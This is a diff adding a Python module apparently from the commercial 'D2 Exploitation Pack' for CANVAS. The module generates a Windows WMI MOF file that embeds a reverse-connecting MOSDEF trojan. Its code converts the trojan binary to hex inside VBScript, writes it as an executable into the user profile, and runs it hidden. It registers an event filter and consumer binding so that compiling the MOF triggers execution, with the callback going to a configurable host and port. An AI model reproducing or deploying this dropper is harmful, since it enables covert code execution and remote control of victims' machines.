@@ -1,0 +1,159 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license 
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2013
+#
+
+
+import sys
+
+if '.' not in sys.path: 
+	sys.path.append('.')
+
+from canvasexploit import canvasexploit
+from exploitutils import *
+from libs.canvasos import *
+
+import canvasengine
+
+NAME = "D2 MOF file trojan generator"
+DESCRIPTION = "MOF file generator with embedded MOSDEF trojan"
+DOCUMENTATION = {}
+
+VERSION = "1.0"
+
+PROPERTY = {}
+PROPERTY['TYPE'] = "Tool"
+PROPERTY['ARCH'] = [ ["All"] ]
+
+affectsList = ["Tools"]
+
+runAnExploit_gtk2 = canvasengine.runAnExploit_gtk2
+runExploit = canvasengine.runExploit
+
+
+class theexploit(canvasexploit):
+    def __init__(self):
+        canvasexploit.__init__(self)
+        self.setInfo(DESCRIPTION)
+        self.result         = ""
+        self.name           = NAME
+        self.filename       = "d2.mof"
+        self.callback_host  = None
+        self.callback_port  = 5555
+        self.OS             = "Windows"
+        self.ARCH           = "X86"
+        self.HTTP           = False
+        self.SSL            = False
+        self.Universal      = False
+        self.encrypted      = False
+
+    def generateMOF(self, binary):
+        vbs = ''
+        for i in range(0, len(binary), 8):
+            vbs += '"binary = binary & \\"'
+            for j in range(8):
+                if (i+j) >= len(binary):
+                    break
+                vbs += '%02x'%(ord(binary[i+j]))
+                if (i+j) != len(binary)-1:
+                    vbs += ','
+            vbs += '\\"\\n"\n'
+            
+        vbs += '"tmp = Split(binary, \\",\\")\\n"\n'
+        vbs += '"Set fso = CreateObject(\\"Scripting.FileSystemObject\\")\\n"\n'
+        vbs += '"Set shell = CreateObject(\\"WScript.Shell\\")\\n"\n'
+        vbs += '"userprofile = shell.ExpandEnvironmentStrings(\\"%USERPROFILE%\\")\\n"\n'
+        vbs += '"path = userprofile & \\"\\\\\\" & \\"d2_%d.exe\\"\\n"\n'%(random.randint(1,99))
+        vbs += '"Set f = fso.CreateTextFile(path, True)\\n"\n'
+        vbs += '"For i = 0 To UBound(tmp)\\n"\n'
+        vbs += '"  b = Int(\\"&H\\" & tmp(i))\\n"\n'
+        vbs += '"  f.Write Chr(b)\\n"\n'
+        vbs += '"Next\\n"\n'
+        vbs += '"f.Close\\n"\n'
+        vbs += '"shell.Run Chr(34) & path & Chr(34), 7, false\\n"'
+
+        mof = """#pragma namespace ("\\\\\\\\.\\\\root\\\\subscription")
+
+#pragma deleteclass("MyASEventConsumer", nofail)
+#pragma deleteinstance("__EventFilter.Name=\\\"EF\\\"", nofail)
+#pragma deleteinstance("ActiveScriptEventConsumer.Name=\\\"ASEC\\\"", nofail)
+
+class MyASEventConsumer
+{
+	[key]string Name;
+};
+
+instance of ActiveScriptEventConsumer as $CONSUMER
+{
+    CreatorSID = {1,2,0,0,0,0,0,5,32,0,0,0,32,2,0,0};
+    Name = "ASEC";
+    ScriptingEngine = "VBScript";    
+    ScriptText =
+SCRIPT;
+};
+
+instance of __EventFilter as $FILTER
+{
+    CreatorSID = {1,2,0,0,0,0,0,5,32,0,0,0,32,2,0,0};
+    Name = "EF";
+    Query = "SELECT * FROM __InstanceCreationEvent"
+        " WHERE TargetInstance.__class = \\"MyASEventConsumer\\"";
+    QueryLanguage = "WQL";
+};
+
+instance of __FilterToConsumerBinding as $BINDING
+{
+    CreatorSID = {1,2,0,0,0,0,0,5,32,0,0,0,32,2,0,0};
+    Filter = $FILTER;
+    Consumer = $CONSUMER;
+};
+
+instance of MyASEventConsumer
+{
+     Name = "Trigger";
+};
+""".replace('SCRIPT', vbs)
+        return mof
+
+    def getargs(self):
+        self.getarg("filename")
+        self.getarg("callback_host")
+        self.getarg("callback_port")
+        self.getarg("OS")
+        self.getarg("Universal")
+        self.HTTP = int(self.HTTP)
+        self.getarg("SSL")
+        self.getarg("encrypted")        
+        self.SSL = int(self.SSL)
+    
+    def run(self):
+        self.getargs()
+        self.setInfo("%s (in progress)" % (NAME))
+        
+        t_os = canvasos(self.OS)
+        t_os.arch = self.ARCH
+        self.log("Building MOSDEF trojan for: %s %s" % (t_os, t_os.arch))
+        self.log('Universal: %s' % self.Universal)
+        self.log('Encrypted: %s' % self.encrypted)
+        
+        try:
+            ret = self.buildmosdeftrojan(self.callback_host, self.callback_port, target_os=t_os, http=self.HTTP, ssl=self.SSL, universal=self.Universal, encrypted=self.encrypted)
+        except Exception, err:
+            self.log("Problem building the MOSDEF trojan: %s"%(err))
+            self.setInfo("%s - failed" % (NAME))
+            return 0
+        
+        moffile = self.generateMOF(self.mosdeftrojan)         
+        file(self.filename,"wb").write(moffile)
+        self.setInfo("%s - done" % (NAME))
+        
+        return len(moffile) != 0
+
+if __name__=="__main__":
+    print "Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION)
+    app = theexploit()
+    ret = standard_callback_commandline(app)
